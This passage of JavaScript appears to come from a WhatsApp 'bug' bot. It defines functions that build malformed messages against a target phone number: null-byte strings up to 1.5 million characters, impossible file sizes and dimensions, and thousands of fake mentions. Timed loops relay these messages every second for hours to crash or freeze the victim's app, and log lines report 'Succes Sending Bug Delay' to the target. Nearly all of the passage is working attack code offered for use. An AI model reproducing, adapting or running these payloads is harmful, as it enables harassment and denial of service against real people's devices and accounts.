                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 99999,
                width: 99999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}.enc`,
                thumbnailSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailEncSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎"
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "X" },
                { name: "galaxy_message", buttonParamsJson: "{\"flow_message_version\":\"3\"}" },
                { name: "call_permission_message", buttonParamsJson: "\x10".repeat(10000) }
              ],
              messageParamsJson: "X" + "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@lid`)
              ],
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { conversation: " X " }
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
async function otaxnewdocu2(sock, target) {
console.log(chalk.red(`𝗧𝗿𝗲𝘃𝗼𝘀𝗶𝘂𝗺 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let docu = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
    "fileLength": "999999999",
    "pageCount": 92828282882,
    "mediaKey": "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
    "fileName": "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎.pdf",
    "fileEncSha256": "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
    "directPath": "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752349203",
    "contactVcard": true,
    "thumbnailDirectPath": "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
    "thumbnailSha256": "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
    "thumbnailEncSha256": "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
    "contextInfo": {
      "expiration": 1,
      "ephemeralSettingTimestamp": 1,
      "forwardingScore": 9999,
      "isForwarded": true,
      "remoteJid": "status@broadcast",
      "disappearingMode": {
        "initiator": "INITIATED_BY_OTHER",
        "trigger": "UNKNOWN_GROUPS"
      },
      "StatusAttributionType": 1,
      "forwardedAiBotMessageInfo": {
         "botName": "Meta",
          "botJid": "13135550002@s.whatsapp.net",
          "creatorName": "trevosium"
      },
      "externalAdReply": {
          "showAdAttribution": false,
          "renderLargerThumbnail": true
      },
      "quotedMessage": {
        "paymentInviteMessage": {
          "serviceType": 1,
          "expiryTimestamp": null
        }
      }
    },
    "thumbnailHeight": 480,
    "thumbnailWidth": 339,
    "caption": "ꦾ".repeat(150000)
  }
	}), { participant: { jid: target }
});

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}

async function OctarineBlanks(sock, target) {
  try {
    const octarine = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎" + "𑇂𑆵𑆴𑆿".repeat(10000) 
            },
            header: {
              documentMessage: {
                title: "ꦾ".repeat(25000) + "~@1~".repeat(25000),
                url: "https://Wa.me/stickerPack/Xavienzz",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: 9999999999999,
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎.pdf",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1735456100,
                caption: "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎" + "ꦾ".repeat(25000) + " ҈⃝⃞⃟҈⃝⃞⃟҈⃝⃞⃟҈⃝⃞⃟ ".repeat(5000)
              }
            },
            contextInfo: {
              participant: target,
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, octarine, {});
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

  } catch (err) {
    console.error("Error Octarine Blanks:", err);
  }
}

///=====( Delay Buldozerr )======\\\
  
async function TrdxtCountV5(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.blue(`Succes Sending Bug DelayBuldo To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await BuldozerNoDelay(sock, target);
      await SemzNewDelayinvis(sock, target);
      await otaxintermi(sock, target, mention = true);
      await VnXDelayXBulldoNew(sock, target);

      amount++;
      console.log(chalk.blue(`Succes Sending Bug DelayBuldo To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.blue(`Succes Sending Bug DelayBuldo To ${target}`));
      amount = 0;

      console.log(chalk.blue(`Succes Sending Bug DelayBuldo To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function BuldozerNoDelay(sock, target) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "\u0000",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 20900 }, () => ({
                  type: 1
                }))
              }
            },
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "{ X: { status:true } }",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Msg, {
      participant: { jid: target }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function VnXDelayXBulldoNew(sock, target) {
 await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          header: {
            listMessage: {
              title: "\u0000".repeat(35000),
              description: "\u0000".repeat(25000),
              buttonText: "X",
              footerText: "",
              listType: 1,
            sections: [
           {
            title: "",
              rows: Array.from({ length: 1900 }, (_, i) => ({
              title: `\u0000`.repeat(25000),
              description: `\u0000`.repeat(25000),
              rowId: null
              }))
            }
          ],
          body: {
            text: "X",
            title: "X"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(150000),
            version: 3
            }
          }
        }
      }
    }
  }
}, { participant: { jid: target } });
}

async function otaxintermi(sock, target, mention = true) {
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY="
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc="
    }
  ];

  let sequentialIndex = 0;

  for (let z = 0; z < 75; z++) {
    const msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `6285983729${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "\u0000".repeat(5000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      },
      {}
    );

    const selectedMedia = mediaData[sequentialIndex];
    sequentialIndex = (sequentialIndex + 1) % mediaData.length;

    const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

    const contextInfo = {
      participant: target,
      mentionedJid: [
        target,
        ...Array.from(
          { length: 2000 },
          () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        )
      ]
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
            fileSha256: SHA256,
            fileEncSha256: ENCSHA256,
            mediaKey: mkey,
            mimetype: "image/webp",
            directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
            fileLength: {
              low: Math.floor(Math.random() * 1000),
              high: 0,
              unsigned: true
            },
            mediaKeyTimestamp: {
              low: Math.floor(Math.random() * 1700000000),
              high: 0,
              unsigned: false
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: msg.message } },
      mention
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: stickerMsg.viewOnceMessage.message } },
      mention
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}

async function SemzNewDelayinvis(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            header: {
              title: "\u0000" + "{{".repeat(25000)
            },
            body: {
              text: "X"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1500000),
              version: 3
            },
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

//=====( Delay Invisible )====\\

async function TrdxtCountV1(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await BetaExploit(target);

      amount++;
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      amount = 0;

      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function BetaExploit(target) {
  try {
    await sock.presenceSubscribe(target);
    await sock.sendPresenceUpdate('composing', target);
    await new Promise(resolve => setTimeout(resolve, 1500));

    const mentions1 = Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 900000000) + "@s.whatsapp.net"
    );

    const extendedMsg = {
      extendedTextMessage: {
        text: "\u0000",
        locationMessage: {
          degreesLatitude: 617267,
          degreesLongitude: -6172677,
          isLive: true,
          accuracyInMeters: 100,
          jpegThumbnail: null,
        },
        contextInfo: {
          forwardingScore: 9471,
          isForwarded: true,
          mentionedJid: mentions1,
          participant: target,
          stanzaId: target,
          remoteJid: target,
        },
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
      },
    };

    const paymentPayload = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_key_info",
              buttonParamsJson: "{}",
            },
            {
              name: "payment_system",
              buttonParamsJson: "{}",
            },
          ],
        },
      },
    };

    const heavyPayload = {
      interactiveResponseMessage: {
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: JSON.stringify({
            values: {
              in_pin_code: "999999",
              building_name: "saosinx",
              landmark_area: "X",
              address: "Mxc",
              tower_number: "Mxc",
              city: "chindo",
              name: "Cy4",
              phone_number: "999999999999",
              house_number: "xxx",
              floor_number: "xxx",
              state: "D | " + "\u0000".repeat(190000),
            },
            version: 3,
          }),
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) =>
            `6285983729${y + 1}@s.whatsapp.net`
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
          },
        },
      },
    };

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: extendedMsg } },
      { participant: { jid: target } }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: paymentPayload } },
      { participant: { jid: target } }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: heavyPayload } },
      { participant: { jid: target } }
    );

  } catch (err) {
    console.log(err);
  }
}

async function TrdxtCountV2(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await CharlyProfSex(sock, target);

      amount++;
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      amount = 0;

      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function CharlyProfSex(sock, target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 1,
    width: -9999999999999999999999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "ោ៝".repeat(2000)
  };

  let warux2 = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
        { length: 1900 },
        (_, y) => `6285983729${y + 1}@s.whatsapp.net`
        ),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          newsletterName: "ោ៝".repeat(2000),
          serverMessageId: 100,
          accessibilityText: null
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
      body: { text: "X¿🩸?X", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "cta_call",
        paramsJson: `{\"display_text\":\"${"\u0000".repeat(150000)}\",\"phone_number\":\"00000000000000\"}`,
        version: 3
      }
    }
  };

  let warux = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          items: [
            { imageMessage: imageMsg }
          ],
          contextInfo: {
            mentionedJid: [
              "928833219@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            
            eventCoverImage: {
              eventId: Date.now() + 1814400000,
              eventName: "Fuck",
              eventDescription: "ꦽ".repeat(2000),
              startTime: 9999999999,
              endTime: 99999999999,
              eventCoverMedia: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                caption: "ោ៝".repeat(2000),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k="
              },
              eventLocation: {
                name: "Trevosium_Ghost",
                address: "ោ៝".repeat(2000),
                degreesLatitude: -922.99999999,
                degreesLongitude: 922.999999999999,
                url: "https://t.me/Xavienzz" + "\u0000".repeat(554900)
              },
              eventParticipants: {
                participants: [{ jid: target, displayName: "Participant" }]
              },
              eventStatus: "@X",
              eventOptions: {
                isAnonymous: true,
                canGuestsInvite: true,
                canSeeGuestList: true,
                maxParticipants: 9999999999,
                requiresApproval: false,
                customField1: "fuckyou",
                customField2: "ahah"
              },
              eventMetadata: JSON.stringify({
                heavy_data: "ACCOUNTS",
                nested: {
                  level1: "X".repeat(546),
                  level2: {
                    level3: "X".repeat(546),
                    level4: {
                      level5: "X".repeat(546),
                      array_data: Array(100).fill().map(() => ({
                        item: "Ngeset",
                        details: "X"
                      }))
                    }
                  }
                }
              }),
              binaryData: "\u0081".repeat(0x7000)
            }
          }
        }
      }
    }
  }, {});

  let warux2ViewOnce = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: warux2
    }
  }, {});
  
  const msg = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              audioMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                mimetype: "audio/mpeg",
                fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                fileLength: "999999999999999999",
                seconds: 999999999,
                ptt: parse,
                mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                directPath: "/v/t62.7114-24/...",
                mediaKeyTimestamp: Date.now(),
                contextInfo: {
                  mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                    ),
                  ],
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: "1234567890@newsletter",
                    serverMessageId: 1,
                    newsletterName: "𞋯".repeat(2500),
                  },
                },
                waveform:
                  "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
              },
            },
          },
        },
      },
    };

    const xvzz = await generateWAMessageFromContent(target, msg, {
      userJid: target,
    });
    
    const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [ 
            "13135550002@s.whatsapp.net",
           ...Array.from({ length: 1900 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
             )
           ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg2 = await generateWAMessageFromContent(target, message, {
      userJid: target,
    });

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
